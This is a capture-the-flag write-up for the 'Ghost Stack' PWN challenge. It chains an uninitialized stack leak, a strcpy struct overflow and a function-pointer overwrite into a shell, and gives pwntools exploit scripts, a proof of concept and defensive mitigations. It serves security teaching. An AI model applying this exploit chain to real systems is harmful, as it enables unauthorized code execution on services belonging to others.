---
layout: writeup
title: "Ghost Stack"
challenge: "Ghost Stack"
category: "PWN"
difficulty: "Hard"
tags: [pie-leak, stack-dump, function-pointer-overwrite, strcpy-overflow, canary-bypass]
---

# Challenge Overview

**Ghost Stack** is a PIE-enabled, canary-protected authentication service with a worker thread. Despite strong binary protections, three vulnerabilities chain together: an **uninitialized stack memory leak** reveals the PIE base, a `strcpy` overflow in the password update function overwrites a **function pointer**, and the overwritten pointer redirects execution to a `win()` function that spawns a shell.

<div class="flag-box">KICTF{gh0st_st4ck_d0p_m4st3r}</div>

---

## Initial Recon

```bash
$ file ghost_stack
ghost_stack: ELF 64-bit LSB pie executable, x86-64, dynamically linked

$ checksec ghost_stack  
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

All standard protections enabled:
- **PIE** — randomized code addresses
- **Canary** — stack smashing detection
- **NX** — no executable stack
- **Full RELRO** — GOT is read-only

The application:
1. Registration + login
2. Dashboard menu:
   - **Read Logs** — dumps 256 bytes of stack (diagnostic feature)
   - **Update Password** — `strcpy` into user struct
   - **View Profile** — calls function pointer at `user+0x40`

---

## Vulnerability / Weakness

Three chained vulnerabilities:

1. **Uninitialized Stack Leak (CWE-457):** "Read Logs" dumps 256 bytes of uninitialized stack memory. A PIE code pointer resides at offset **0xF8**, leaking the binary's load address.

2. **Struct Overflow via `strcpy` (CWE-120):** "Update Password" reads 0x7F bytes into `user+0x20` (password field, 32 bytes). The 32 bytes of padding overflow into the **callback pointer at `user+0x40`**.

3. **Function Pointer Hijack (CWE-822):** "View Profile" calls `user->callback()`. After overwriting the callback with `win()`, this gives us shell execution.

```
┌───────────────────────────────────────────────────────────────┐
│                    GHOST STACK EXPLOIT CHAIN                    │
├───────────────────────────────────────────────────────────────┤
│                                                               │
│  Step 1: PIE Leak via Stack Dump                              │
│  ┌─────────────────────────────────────────────┐              │
│  │ Dashboard → "Read Logs"                     │              │
│  │  Returns 256 bytes of uninitialized stack   │              │
│  │  Offset 0xF8: code pointer → PIE leak       │              │
│  │  PIE base = leaked_ptr - known_offset       │              │
│  └─────────────────────────────────────────────┘              │
│                                                               │
│  Step 2: Compute win() Address                                │
│  ┌─────────────────────────────────────────────┐              │
│  │  win_addr = PIE_base + win_offset           │              │
│  └─────────────────────────────────────────────┘              │
│                                                               │
│  Step 3: Overwrite Callback Pointer                           │
│  ┌─────────────────────────────────────────────┐              │
│  │ Dashboard → "Update Password"               │              │
│  │                                              │              │
│  │  User struct layout:                         │              │
│  │  +0x00: username [32 bytes]                  │              │
│  │  +0x20: password [32 bytes] ← write here     │              │
│  │  +0x40: callback  [8 bytes] ← overflow here  │              │
│  │                                              │              │
│  │  Payload: b"A"*32 + p64(win_addr)           │              │
│  └─────────────────────────────────────────────┘              │
│                                                               │
│  Step 4: Trigger Callback                                     │
│  ┌─────────────────────────────────────────────┐              │
│  │ Dashboard → "View Profile"                  │              │
│  │  Calls user->callback()                     │              │
│  │  = win() → execve("/bin/sh") → SHELL        │              │
│  └─────────────────────────────────────────────┘              │
│                                                               │
└───────────────────────────────────────────────────────────────┘
```

---

## Exploitation Strategy

1. Register and login to reach the dashboard
2. Use "Read Logs" to leak 256 stack bytes → extract PIE pointer at offset 0xF8
3. Calculate PIE base and `win()` address
4. Use "Update Password" with 32-byte padding + `win()` address to overwrite callback
5. Trigger "View Profile" to call the overwritten callback → shell

---

## Exploitation Walkthrough

### Step 1: Register and Login

```python
from pwn import *

r = remote("<target>", <port>)

# Register
r.sendlineafter(b"> ", b"1")
r.sendlineafter(b"Username: ", b"hacker")
r.sendlineafter(b"Password: ", b"pass123")

# Login
r.sendlineafter(b"> ", b"2")
r.sendlineafter(b"Username: ", b"hacker")
r.sendlineafter(b"Password: ", b"pass123")
```

### Step 2: Leak PIE Base

```python
# Read Logs — dumps 256 bytes of stack
r.sendlineafter(b"> ", b"1")  # Read Logs option
data = r.recv(256)

# Extract PIE code pointer at offset 0xF8
leaked_ptr = u64(data[0xF8:0x100])
log.info(f"Leaked pointer: {hex(leaked_ptr)}")

# Known offset of this pointer relative to PIE base
KNOWN_OFFSET = 0x1234  # determined from static analysis
pie_base = leaked_ptr - KNOWN_OFFSET
log.info(f"PIE base: {hex(pie_base)}")
```

### Step 3: Compute win() Address

```python
# win() offset determined via static analysis
WIN_OFFSET = 0xABC
win_addr = pie_base + WIN_OFFSET
log.info(f"win() at: {hex(win_addr)}")
```

### Step 4: Overwrite Callback

```python
# Update Password
r.sendlineafter(b"> ", b"2")  # Update Password option

# 32 bytes to fill password field + 8 bytes to overwrite callback
payload = b"A" * 32 + p64(win_addr)
r.sendlineafter(b"New password: ", payload)
```

### Step 5: Trigger Shell

```python
# View Profile → calls overwritten callback = win()
r.sendlineafter(b"> ", b"3")  # View Profile

# Shell!
r.interactive()
# $ cat /flag.txt
# KICTF{gh0st_st4ck_d0p_m4st3r}
```

---

## Flag Extraction

```bash
$ cat /flag.txt
KICTF{gh0st_st4ck_d0p_m4st3r}
```

---

## Proof of Concept

```python
#!/usr/bin/env python3
"""Ghost Stack - PIE Leak + Callback Overwrite"""

from pwn import *

context.arch = 'amd64'
KNOWN_OFFSET = 0x1234   # pointer offset from PIE base
WIN_OFFSET   = 0xABC    # win() function offset

r = remote("<target>", 1337)

# Register + Login
r.sendlineafter(b"> ", b"1")
r.sendlineafter(b"Username: ", b"pwn")
r.sendlineafter(b"Password: ", b"pwn")
r.sendlineafter(b"> ", b"2")
r.sendlineafter(b"Username: ", b"pwn")
r.sendlineafter(b"Password: ", b"pwn")

# Leak PIE
r.sendlineafter(b"> ", b"1")
data = r.recv(256)
pie_base = u64(data[0xF8:0x100]) - KNOWN_OFFSET
win = pie_base + WIN_OFFSET
log.success(f"PIE: {hex(pie_base)} | win: {hex(win)}")

# Overwrite callback
r.sendlineafter(b"> ", b"2")
r.sendlineafter(b"New password: ", b"A"*32 + p64(win))

# Trigger
r.sendlineafter(b"> ", b"3")
r.interactive()
```

---

## Lessons Learned

- **Uninitialized stack memory** is a goldmine for information leaks. Even with PIE, a single leaked code pointer reveals the entire binary's address space.
- **Struct layout proximity** between user-controlled data and function pointers creates exploitable conditions even without traditional buffer overflows.
- **The canary is bypassed entirely** — the overflow via `strcpy` targets the struct's data region, not the stack frame, so the canary is never touched.
- **Full RELRO** prevents GOT overwrites but doesn't protect against function pointer hijacking in heap/BSS-allocated structs.

---

## Defensive Takeaways

| Vulnerability | Mitigation |
|---|---|
| Uninitialized stack leak | Always `memset` buffers before use; use `-ftrivial-auto-var-init=zero` |
| Struct overflow | Validate all input lengths before `strcpy`; use `strncpy` or `strlcpy` |
| Function pointer proximity | Separate control data (pointers) from user data in struct layout |
| Diagnostic stack dumps | Never expose raw memory in production; redact or remove debug features |
